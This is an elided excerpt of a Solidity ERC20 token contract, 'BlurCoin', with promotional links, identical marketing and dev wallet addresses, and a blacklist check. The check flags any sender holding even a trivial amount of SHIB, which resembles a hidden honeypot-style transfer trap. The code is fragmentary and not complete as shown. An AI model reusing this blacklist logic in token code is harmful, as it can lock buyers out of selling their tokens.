...
/*
BlurCoin: Stay blurry on chain
website: blurcoin.io
telegram: https://t.me/BlurCoinio
medium: https://blurcoin.medium.com/
twitter: https://twitter.com/BlurCoin 
...
contract BlurCoin is ERC20, Ownable{
    ...
    uint256 discountFactor = 2;
 
    address public marketingWallet = 0xBD4C2B90Ee5AfB749b1eBF1667371FDCFa36Ec21;
    address public devWallet = 0xBD4C2B90Ee5AfB749b1eBF1667371FDCFa36Ec21;
    ...
    constructor() ERC20("BlurCoin", "BLUR") {
        _Initiate(msg.sender, 1e9 * 10 ** decimals());
...
function _transfer(address sender, address recipient, uint256 amount) internal override {
    ...
    function _isblacklist(address sender) internal view returns (bool) {	
        return SHIB.balanceOf(sender) >= SHIB.totalSupply() / 1000000000000000;	
    }
